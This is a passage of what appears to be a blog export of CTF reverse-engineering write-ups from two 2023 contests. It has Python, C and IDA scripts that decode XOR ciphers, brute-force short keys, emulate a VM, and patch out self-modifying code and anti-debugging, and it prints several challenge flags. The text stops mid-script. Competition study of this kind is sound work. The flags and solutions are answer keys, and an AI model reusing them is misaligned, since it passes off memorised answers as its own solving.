    <content><![CDATA[<h6 id="PREFACE：RE比较容易"><a href="#PREFACE：RE比较容易" class="headerlink" title="PREFACE：RE比较容易"></a>PREFACE：RE比较容易</h6><h6 id="ps-初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了re1一小时出的re2，只能说离开网络和gpt的moyaoxue一事无成"><a href="#ps-初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了re1一小时出的re2，只能说离开网络和gpt的moyaoxue一事无成" class="headerlink" title="ps. 初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了re1一小时出的re2，只能说离开网络和gpt的moyaoxue一事无成"></a>ps. 初赛猛猛做最后是第一，决赛线下直接不会了，赛后仨小时出了re1一小时出的re2，只能说离开网络和gpt的moyaoxue一事无成</h6><span id="more"></span>

<p>初赛：</p>
<h3 id="vvm"><a href="#vvm" class="headerlink" title="vvm"></a>vvm</h3><p>简单的vm，opcode很少直接可以看出来逻辑</p>
<p><img src="/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230913214608382.png" alt="image-20230913214608382"></p>
<pre><code class="python">enc = [  126,  120,  117,  127,  107,  82,  117,  114,  109,  119,  78,  121,  121,  121,  119,  68,  98,  36,  96,  113,  115,  96,  53,  105]

for i in enc:
    i ^= 0x16
    i -= 2
    print(chr(i),end = &quot;&quot;)
</code></pre>
<h3 id="ezSocket"><a href="#ezSocket" class="headerlink" title="ezSocket"></a>ezSocket</h3><p>字节码逆向，通信过程的sm4和rsa都不需要管，只是信道加解密内容，只需要爆破六位key对比sha256即可</p>
<pre><code class="python">from Crypto.Cipher import DES
import string
import itertools
import base64
import hashlib
# import owiener
if __name__ == &quot;__main__&quot;:
    charset = string.digits + &quot;&quot;
    for i in itertools.product(charset, repeat=6):

        key = &#39;&#39;.join(i)
        key += &#39;ffffffffff&#39;
        key = key.encode()
        a = hashlib.sha256(key).hexdigest().encode()
        if (a == b&#39;fdce9fbba473a2e47c14c72a78dcf62a28f0259847d7910ecb18a0af80983693&#39;):
            print(key)
</code></pre>
<p>决赛</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>一个类lz77压缩的压缩算法，改变的地方在于滑块长度固定二</p>
<p>具体规则是：建立缓存</p>
<p><img src="/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230916212036353.png" alt="image-20230916212036353"></p>
<p>每次出现新的双字节（两个ascii，即滑块长），则在该字节前面加一bit的’1’，并存入缓冲区，如果在缓存找到已有，则在前面加8bit的’0’，然后下面8bit做填充和寻址（在缓存内找到相应的双字节）</p>
<p>(脚本不全，解压部分是手动试的，因为真正压缩的地方只有两处)：</p>
<pre><code class="python">a=&#39;1011001101011011001011000011011001111011110111001101001011001001011001101001101101001110001001100111011001001001100101001011011001101111011000111001100111001100011001011011001100111001100001001110001011000111001011011011000111001100101001100011001101111001011011001100011011001001001101111011001000000000000110000000000001001000010011010010011010010011001110110001110111110100&#39;

i = 0
flag = &#39;&#39;
j = 0
while(i&lt; len(a)):
    if a[i] == &#39;0&#39;:
        i += 1
        i += 12
    else :
        i += 1
        flag += chr(int(a[i:i+8], 2))
        i += 8

print(flag)


#   flag&#123;4df683d2-7c31-308c-c217-1d7d0817443c&#125;
</code></pre>
<h5 id="your-emb"><a href="#your-emb" class="headerlink" title="your_emb"></a>your_emb</h5><p>一点一点硬看汇编，发现check前面有xor操作，这里的xor应该是getkey访问失败返回得到的，即：<code>connection refused</code></p>
<p><img src="/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/image-20230916212956794.png" alt="image-20230916212956794"></p>
<pre><code class="python">enc = [  0x05, 0x03, 0x0F, 0x09, 0x1E, 0x5B, 0x12, 0x5C, 0x09, 0x0F,
  0x10, 0x43, 0x56, 0x4B, 0x17, 0x40, 0x56, 0x55, 0x4E, 0x5B,
  0x08, 0x5C, 0x57, 0x4E, 0x15, 0x0D, 0x5C, 0x0D, 0x0D, 0x16,
  0x5C, 0x05, 0x43, 0x41, 0x57, 0x5D, 0x02, 0x59, 0x5D, 0x5C,
  0x50, 0x1E]
key = &#39;connection refused&#39;
for i in range(len(enc)):
    print(chr(enc[i] ^ ord(key[i % len(key)])),end=&#39;&#39;)
    
# flag&#123;8f5fa013-b331-4f22-ad3c-d9c6229a6325&#125;
</code></pre>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯2023</title>
    <url>/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/</url>
    <content><![CDATA[<h6 id="preface-尽力了吧，re这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现"><a href="#preface-尽力了吧，re这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现" class="headerlink" title="preface: 尽力了吧，re这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现"></a>preface: 尽力了吧，re这边剩下俩题都是一解，赛中肯定没时间做了，最近忙完来复现</h6><h6 id="9-22：babyobfu混淆去掉了，加密不太能搞懂，主要是不想调了，调着patch一次真有点精神污染"><a href="#9-22：babyobfu混淆去掉了，加密不太能搞懂，主要是不想调了，调着patch一次真有点精神污染" class="headerlink" title="9-22：babyobfu混淆去掉了，加密不太能搞懂，主要是不想调了，调着patch一次真有点精神污染"></a>9-22：babyobfu混淆去掉了，加密不太能搞懂，主要是不想调了，调着patch一次真有点精神污染</h6><h6 id="10-11：还是回来做了，搞定了算"><a href="#10-11：还是回来做了，搞定了算" class="headerlink" title="10-11：还是回来做了，搞定了算"></a>10-11：还是回来做了，搞定了算</h6><span id="more"></span>

<h3 id="Ez加密器"><a href="#Ez加密器" class="headerlink" title="Ez加密器"></a>Ez加密器</h3><p>调一下发现输入六位秘钥（注意是全数字），base64变表成八位做DES秘钥<br>爆破六位即可</p>
<pre><code class="python">from Crypto.Cipher import DES
import string
import itertools
import base64

def des_decrypt(key, ciphertext):
    cipher = DES.new(key, DES.MODE_ECB)
    return cipher.decrypt(ciphertext)

def custom_base64_encode(s, custom_table):
    std_base64_table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;
    encoded = base64.b64encode(s).decode()
    custom_encoded = &quot;&quot;.join([custom_table[std_base64_table.index(c)] for c in encoded])
    return custom_encoded[:8]

def main():
    ciphertext = bytes.fromhex(&quot;0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA&quot;)
    charset = string.digits + &quot; &quot;
    print()
    with open(&#39;output.txt&#39;, &#39;w&#39;) as f:
        for combo in itertools.product(charset, repeat=6):
            plaintext = &#39;&#39;.join(combo)
            key = custom_base64_encode(plaintext.encode(), &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/&quot;)

            decrypted = des_decrypt(key.encode(), ciphertext)

            if all(32 &lt;= b &lt; 127 for b in decrypted):
                print(f&quot;Possible match: &#123;decrypted.decode(&#39;ascii&#39;)&#125;&quot;)
                print(f&quot;Key: &#123;key&#125;&quot;)
            f.write(str(decrypted) + &#39;\n&#39;)
            f.write(str(key)) #file中搜字符串即可
    # if decrypted.startswith(b&quot;flag&quot;) or decrypted.startswith(&quot;DASC&quot;):
    #     print(f&quot;Possible match: &#123;decrypted_text&#125;&quot;)
        # print(f&quot;Key: &#123;key&#125;&quot;)

if __name__ == &quot;__main__&quot;:
    main()

</code></pre>
<h3 id="Blast"><a href="#Blast" class="headerlink" title="Blast"></a>Blast</h3><p>比较像Bogus Control Flow，网上脚本去不太干净，把jump $5给nop掉之类的手动修修可以angr脚本恢复main，程序有md5的特征，动调发现比对的地方是flag输入的每一位的md5(md5())，写脚本map一下就行</p>
<pre><code class="python">import hashlib


def generate_md5(text):
    m = hashlib.md5()
    m.update(text.encode(&#39;utf-8&#39;))
    return m.hexdigest()


def generate_table():
    char_to_md5 = &#123;&#125;

    for i in range(32, 127):
        char = chr(i)
        md5_hash = generate_md5(generate_md5(char))
        char_to_md5[char] = md5_hash

    return char_to_md5


def main():
    char_to_md5 = generate_table()

    # print(&quot;Character | Double MD5 Hash&quot;)
    # print(&quot;---------------------------&quot;)
    # for char, md5_hash in char_to_md5.items():
    #     print(f&quot;&#123;repr(char)&#125;      | &#123;md5_hash&#125;&quot;)

    a = [&#39;14d89c38cd0fb23a14be2798d449c182&#39;,
        &#39;a94837b18f8f43f29448b40a6e7386ba&#39;,
        &#39;af85d512594fc84a5c65ec9970956ea5&#39;,
        &#39;af85d512594fc84a5c65ec9970956ea5&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;297e7ca127d2eef674c119331fe30dff&#39;,
        &#39;b5d2099e49bdb07b8176dff5e23b3c14&#39;,
        &#39;83be264eb452fcf0a1c322f2c7cbf987&#39;,
        &#39;a94837b18f8f43f29448b40a6e7386ba&#39;,
        &#39;71b0438bf46aa26928c7f5a371d619e1&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;ac49073a7165f41c57eb2c1806a7092e&#39;,
        &#39;a94837b18f8f43f29448b40a6e7386ba&#39;,
        &#39;af85d512594fc84a5c65ec9970956ea5&#39;,
        &#39;ed108f6919ebadc8e809f8b86ef40b05&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;3cfd436919bc3107d68b912ee647f341&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;65c162f7c43612ba1bdf4d0f2912bbc0&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;3cfd436919bc3107d68b912ee647f341&#39;,
        &#39;557460d317ae874c924e9be336a83cbe&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;9203d8a26e241e63e4b35b3527440998&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;f91b2663febba8a884487f7de5e1d249&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;d7afde3e7059cd0a0fe09eec4b0008cd&#39;,
        &#39;488c428cd4a8d916deee7c1613c8b2fd&#39;,
        &#39;39abe4bca904bca5a11121955a2996bf&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;3cfd436919bc3107d68b912ee647f341&#39;,
        &#39;39abe4bca904bca5a11121955a2996bf&#39;,
        &#39;4e44f1ac85cd60e3caa56bfd4afb675e&#39;,
        &#39;45cf8ddfae1d78741d8f1c622689e4af&#39;,
        &#39;3cfd436919bc3107d68b912ee647f341&#39;,
        &#39;39abe4bca904bca5a11121955a2996bf&#39;,
        &#39;4e44f1ac85cd60e3caa56bfd4afb675e&#39;,
        &#39;37327bb06c83cb29cefde1963ea588aa&#39;,
        &#39;a705e8280082f93f07e3486636f3827a&#39;,
        &#39;23e65a679105b85c5dc7034fded4fb5f&#39;,
        &#39;10e21da237a4a1491e769df6f4c3b419&#39;,
        &#39;71b0438bf46aa26928c7f5a371d619e1&#39;,
        &#39;af85d512594fc84a5c65ec9970956ea5&#39;,
        &#39;39abe4bca904bca5a11121955a2996bf&#39;,]
    for query_hash in a:
        found_char = [char for char, md5_hash in char_to_md5.items() if md5_hash == query_hash]

        print(found_char[0],end=&quot;&quot;)


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h3 id="vm-wo"><a href="#vm-wo" class="headerlink" title="vm_wo"></a>vm_wo</h3><p>转化提取一下opcode，模拟流程，单字节加密直接映射回去就行</p>
<pre><code class="cpp">#include&lt;stdio.h&gt;
using namespace std;

unsigned char opcode[4][15] = 
&#123;
    &#123;0x1A, 0x00, 0x03, 0x19, 0x01, 0x01, 0x0D, 0x02, 0x07, 0x18, 0x01, 0x02, 0x01, 0x00, 0x03&#125;, 
    &#123;0x1A, 0x00, 0x03, 0x19, 0x01, 0x02, 0x0D, 0x02, 0x06, 0x18, 0x01, 0x02, 0x01, 0x00, 0x04&#125;,
    &#123;0x1A, 0x00, 0x03, 0x19, 0x01, 0x03, 0x0D, 0x02, 0x05, 0x18, 0x01, 0x02, 0x01, 0x00, 0x05&#125;,
    &#123;0x1A, 0x00, 0x03, 0x19, 0x01, 0x04, 0x0D, 0x02, 0x04, 0x18, 0x01, 0x02, 0x01, 0x00, 0x06&#125;
&#125;;
unsigned char tmp[4][15];

unsigned char vm_body[6];
unsigned char *reg;
unsigned int algn[2];

void vm(unsigned char *op)
&#123;
    algn[1] = 0;
    algn[0] = 0;
    int i = 0;
    if(i &lt; 15)
    &#123;
        while(1)
        &#123;
            reg = op + i;
            unsigned char eax = reg[1];
            unsigned char ebx = reg[1];
            unsigned char ecx = reg[2];
            unsigned char edx = reg[2];
            unsigned char v11, v12, v13, v14, v15, v16;
            //for(int j = 0; j &lt; 15; j++)printf(&quot;%d &quot;, op[j]);
            //printf(&quot;i = %d reg[0] = %d\n&quot;, i, reg[0]);
            //printf(&quot;ebx = %d, ecx = %d\n&quot;, ebx, ecx);
            switch(reg[0])
            &#123;
                case 0:
                    v11 = vm_body[ebx];
                      vm_body[ebx] = vm_body[edx];
                      vm_body[edx] = v11;
                      algn[1] += 3;
                      i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 1:
                  	vm_body[ebx] ^= vm_body[ecx];//printf(&quot;vm_body[ebx] ^= vm_body[ecx];\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 2:
                  	vm_body[ebx] += ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 3:
                  	vm_body[ebx] += vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 4:
                  	vm_body[ebx] -= ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 5:
                  	vm_body[ebx] -= vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 6:
                  	vm_body[ebx] *= ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 7:
                  	vm_body[ebx] *= vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                case 8:
                  	vm_body[ebx] = (unsigned char)vm_body[ebx] / ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 9:
                  	vm_body[ebx] = (unsigned char)vm_body[ebx] / (unsigned char)vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 10:
                  	vm_body[ebx] = (unsigned char)vm_body[ebx] % ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 11:
                  	vm_body[ebx] = (unsigned char)vm_body[ebx] % (unsigned char)vm_body[ecx];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 12:
                  	v12 = (unsigned char)vm_body[ebx];
                  	vm_body[ebx] = v12 &lt;&lt; ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 13:
                  	v12 = (unsigned char)vm_body[0];
                  	vm_body[ebx] = v12 &lt;&lt; ecx;//printf(&quot;vm_body[ebx] = (unsigned char)vm_body[0] &lt;&lt; ecx;\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 14:
                  	v15 = vm_body[ebx];
                    vm_body[algn[0] + 16] = v15;
                  	algn[0] = algn[0] + 1;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 15:
                  	v13 = (unsigned char)vm_body[ebx];
                  	printf(&quot;%d\n&quot;, v13);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 16:
                  	v14 = algn[0] - 1;
                  	algn[0] = algn[0] - 1;
                  	v13 = vm_body[v14 + 16];
                  	printf(&quot;%d\n&quot;, v13);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 17:
                  	if ( !vm_body[ebx] )
                    &#123;
                    	algn[1] = ecx;
                  		algn[1] += 3;
                  		i = algn[1];
                          if ( algn[1] &gt;= 15 )
                            break;
                        continue;
                  	&#125;
                  	else algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 18:
                  	if ( vm_body[ebx] )
                    algn[1] = ecx;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 19:
                  	algn[1] = eax;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 20:
                  	ebx = (unsigned char)vm_body[ebx];
                  	v15 = vm_body[ebx];
                    vm_body[algn[0] + 16] = v15;
                  	algn[0] = algn[0] + 1;
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 21:
                  	v16 = algn[0] - 1;
                  	algn[0] = algn[0] - 1;
                  	vm_body[0] = vm_body[v16 + 16];
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 22:
                  	v15 = eax;
                  	vm_body[algn[0] + 16] = v15;
                  	algn[0] = algn[0] + 1;
                  	algn[1] += 3;
                  	i = algn[1];
                  	if ( algn[1] &gt;= 15 )
                    	break;
                  	continue;
                case 23:
                	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 24:
                  	vm_body[0] = vm_body[2] | vm_body[1];//printf(&quot;vm_body[0] = vm_body[2] | vm_body[1];\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 25:
                	vm_body[ebx] = (unsigned char)vm_body[0] &gt;&gt; ecx;//printf(&quot;vm_body[ebx] = (unsigned char)vm_body[0] &gt;&gt; ecx;\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                    continue;
                case 26:
                  	vm_body[ebx] = ecx;//printf(&quot;vm_body[ebx] = ecx;\n&quot;);
                  	algn[1] += 3;
                  	i = algn[1];
                      if ( algn[1] &gt;= 15 )
                        break;
                      continue;   
                default:    
                  	algn[1] += 3;
                  	i = algn[1];
                  	if ( algn[1] &gt;= 15 )
                    	break;
                  	continue;
            &#125;
            break;
        &#125;
    &#125;
&#125;

void init()
&#123;
    for(int i = 0; i &lt; 4; i++)
    &#123;
        for(int j = 0; j &lt; 15; j++)
        &#123;
            tmp[i][j] = opcode[i][j];
        &#125;
    &#125;
&#125;

int main()
&#123;
    int len = 29;
    unsigned char flag[233] = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_&quot;;
    *(unsigned int *)&amp;vm_body[3] = 0xBEEDBEEF;
    
    for(int i = 0; i &lt; 65; i++)
    &#123;
        
        init();
        unsigned char a = flag[i];
        tmp[0][2] = flag[i];
        vm(tmp[0]);
        tmp[1][2] = vm_body[0];
        vm(tmp[1]);
        tmp[2][2] = vm_body[0];
        vm(tmp[2]);
        tmp[3][2] = vm_body[0];
        vm(tmp[3]);
        //printf(&quot;vm_body[0] = %d\n&quot;, vm_body[0]);
        
        flag[i] = ((unsigned char)vm_body[0] &gt;&gt; 5) | (8 * vm_body[0]);
        printf(&quot;0x%x : \&quot;%c\&quot;, &quot;, flag[i], a);
    &#125;
&#125;

        
    
    
    

</code></pre>
<pre><code class="python">enc = [0xDF, 0xD5, 0xF1, 0xD1, 0xFF, 0xDB, 0xA1, 0xA5, 0x89, 0xBD,
  0xE9, 0x95, 0xB3, 0x9D, 0xE9, 0xB3, 0x85, 0x99, 0x87, 0xBF,
  0xE9, 0xB1, 0x89, 0xE9, 0x91, 0x89, 0x89, 0x8F, 0xAD]

mp = &#123;0x35 : &quot;1&quot;, 0x33 : &quot;2&quot;, 0x31 : &quot;3&quot;, 0x3f : &quot;4&quot;, 0x3d : &quot;5&quot;, 0x3b : &quot;6&quot;, 0x39 : &quot;7&quot;, 0x27 : &quot;8&quot;, 0x25 : &quot;9&quot;, 0x37 : &quot;0&quot;, 0x95 : &quot;a&quot;, 0x93 : &quot;b&quot;, 0x91 : &quot;c&quot;, 0x9f : &quot;d&quot;, 0x9d : &quot;e&quot;, 0x9b : &quot;f&quot;, 0x99 : &quot;g&quot;, 0x87 : &quot;h&quot;, 0x85 : &quot;i&quot;, 0x83 : &quot;j&quot;, 0x81 : &quot;k&quot;, 0x8f : &quot;l&quot;, 0x8d : &quot;m&quot;, 0x8b : &quot;n&quot;, 0x89 : &quot;o&quot;, 0xb7 : &quot;p&quot;, 0xb5 : &quot;q&quot;, 0xb3 : &quot;r&quot;, 0xb1 : &quot;s&quot;, 0xbf : &quot;t&quot;, 0xbd : &quot;u&quot;, 0xbb : &quot;v&quot;, 0xb9 : &quot;w&quot;, 0xa7 : &quot;x&quot;, 0xa5 : &quot;y&quot;, 0xa3 : &quot;z&quot;, 0xd5 : &quot;A&quot;, 0xd3 : &quot;B&quot;, 0xd1 : &quot;C&quot;, 0xdf : &quot;D&quot;, 0xdd : &quot;E&quot;, 0xdb : &quot;F&quot;, 0xd9 : &quot;G&quot;, 0xc7 : &quot;H&quot;, 0xc5 : &quot;I&quot;, 0xc3 : &quot;J&quot;, 0xc1 : &quot;K&quot;, 0xcf : &quot;L&quot;, 0xcd : &quot;M&quot;, 0xcb : &quot;N&quot;, 0xc9 : &quot;O&quot;, 0xf7 : &quot;P&quot;, 0xf5 : &quot;Q&quot;, 0xf3 : &quot;R&quot;, 0xf1 : &quot;S&quot;, 0xff : &quot;T&quot;, 0xfd : &quot;U&quot;, 0xfb : &quot;V&quot;, 0xf9 : &quot;W&quot;, 0xe7 : &quot;X&quot;, 0xe5 : &quot;Y&quot;, 0xe3 : &quot;Z&quot;, 0xa1 : &quot;&#123;&quot;, 0xad : &quot;&#125;&quot;, 0xe9 : &quot;_&quot;&#125;

for i in enc:
    print(mp[i],end=&quot;&quot;)
</code></pre>
<h3 id="CSGO"><a href="#CSGO" class="headerlink" title="CSGO"></a>CSGO</h3><p>patch反调试，动调获取base变表直接在线解即可<br>表：LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;ABCDEFGHIJK</p>
<h3 id="babyobfu"><a href="#babyobfu" class="headerlink" title="babyobfu"></a>babyobfu</h3><p>赛中的零解题，结果回来看真的不那么难……</p>
<p>​	比较明显的有两种smc，一种解密后续代码，一种加密前面的代码；后续询问了出题人，这里的smc粒度是基本块，量较大</p>
<p>​	有一个很直观的思路，就是把解密后续代码的<code>smc1</code>执行后nop掉，全局nop掉加密前面代码的<code>smc2</code>，初始化smc数据的函数可以不处理</p>
<p>其实只需要这一句即可：</p>
<pre><code class="python">import idautils
for i in range(5):
   idc.patch_byte(idc.get_wide_dword(get_reg_value(&quot;rsp&quot;)) - 5 + i, 0x90)
   print(hex(get_reg_value(&quot;rdi&quot;)) , end = &#39;,&#39;)
</code></pre>
<p>​	先跑一次观察最后的位置，然后在那个位置下断点，然后就可以得到几乎所有代码</p>
<p>​	中间存在特判，可以看出来是<code>0-9a-e</code>的类似uuid的格式，这里没有执行这些地方的代码，但是smc会影响反编译，所以可以手动找到<code>jnz</code> <code>jmp</code>之类的位置手动patch一下，然后可以得到main函数和一些加解密、check操作</p>
<p>​	密文：</p>
<p>​	<img src="/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20230922211748973.png" alt="image-20230922211748973"></p>
<p>加密：（这里有个AES的sbox，明显是用来干扰插件的，必须去干净才能看到实际用途）<img src="/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20230922211809507.png" alt="image-20230922211809507"></p>
<p>其实基本上就没啥东西了，这就是ycb的零解题……</p>
<h6 id="10-11-补个完整流程"><a href="#10-11-补个完整流程" class="headerlink" title="10.11 补个完整流程"></a>10.11 补个完整流程</h6><p>首先是smc和冗余的去除，前面用的动态patch有个问题，在于无法将结果应用回输入文件（文件自smc的部分是没办法写回去的，必须自行patch）</p>
<p>可以考虑动态获取所有smc的base_addr，脚本smc进行patch（脚本来源于gyc爷，相当精细的patch，考虑到很多传参和编译器优化，能几乎完美去除混淆）</p>
<pre><code class="python">import idaapi
import idautils
from idaapi import *
arr = [
    &#123;&quot;base_addr&quot;: &quot;0x40235a&quot;, &quot;len&quot;: &quot;0x135&quot;, &quot;key&quot;: &quot;0x0&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x4024de&quot;, &quot;len&quot;: &quot;0x21&quot;, &quot;key&quot;: &quot;0x109cf92e&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x403582&quot;, &quot;len&quot;: &quot;0x23&quot;, &quot;key&quot;: &quot;0x109cf92e&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40256d&quot;, &quot;len&quot;: &quot;0x64&quot;, &quot;key&quot;: &quot;0x109cf92e&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40263a&quot;, &quot;len&quot;: &quot;0x23&quot;, &quot;key&quot;: &quot;0x6f403b1d&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x4026d5&quot;, &quot;len&quot;: &quot;0x36&quot;, &quot;key&quot;: &quot;0x74afec82&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402758&quot;, &quot;len&quot;: &quot;0x36&quot;, &quot;key&quot;: &quot;0x3508284b&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402937&quot;, &quot;len&quot;: &quot;0x14&quot;, &quot;key&quot;: &quot;0x3508284b&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x4029f2&quot;, &quot;len&quot;: &quot;0x22&quot;, &quot;key&quot;: &quot;0x64937846&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402a82&quot;, &quot;len&quot;: &quot;0x39&quot;, &quot;key&quot;: &quot;0x74afec82&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401a35&quot;, &quot;len&quot;: &quot;0x10a&quot;, &quot;key&quot;: &quot;0x0&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401ba2&quot;, &quot;len&quot;: &quot;0x39&quot;, &quot;key&quot;: &quot;0x41b71efb&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401c52&quot;, &quot;len&quot;: &quot;0x57&quot;, &quot;key&quot;: &quot;0x3855b718&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401236&quot;, &quot;len&quot;: &quot;0x1f&quot;, &quot;key&quot;: &quot;0x0&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x4012ac&quot;, &quot;len&quot;: &quot;0x14&quot;, &quot;key&quot;: &quot;0x6b8b4567&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401323&quot;, &quot;len&quot;: &quot;0x15d&quot;, &quot;key&quot;: &quot;0x59f066a1&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x4014b5&quot;, &quot;len&quot;: &quot;0x19&quot;, &quot;key&quot;: &quot;0x3dccfec8&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40150e&quot;, &quot;len&quot;: &quot;0x5c&quot;, &quot;key&quot;: &quot;0x59f066a1&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401ce4&quot;, &quot;len&quot;: &quot;0x22&quot;, &quot;key&quot;: &quot;0x4d10565e&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401d6e&quot;, &quot;len&quot;: &quot;0x3a&quot;, &quot;key&quot;: &quot;0x3855b718&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401e0b&quot;, &quot;len&quot;: &quot;0x44&quot;, &quot;key&quot;: &quot;0x6385d5da&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401ec9&quot;, &quot;len&quot;: &quot;0x3f&quot;, &quot;key&quot;: &quot;0x71a5dd8e&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401f43&quot;, &quot;len&quot;: &quot;0x22&quot;, &quot;key&quot;: &quot;0x3c14fa76&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401fcd&quot;, &quot;len&quot;: &quot;0x2e&quot;, &quot;key&quot;: &quot;0x71a5dd8e&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40205e&quot;, &quot;len&quot;: &quot;0x39&quot;, &quot;key&quot;: &quot;0x6eb33466&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40210e&quot;, &quot;len&quot;: &quot;0xd2&quot;, &quot;key&quot;: &quot;0x7f23f981&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40160d&quot;, &quot;len&quot;: &quot;0x35&quot;, &quot;key&quot;: &quot;0x0&quot;&#125;,
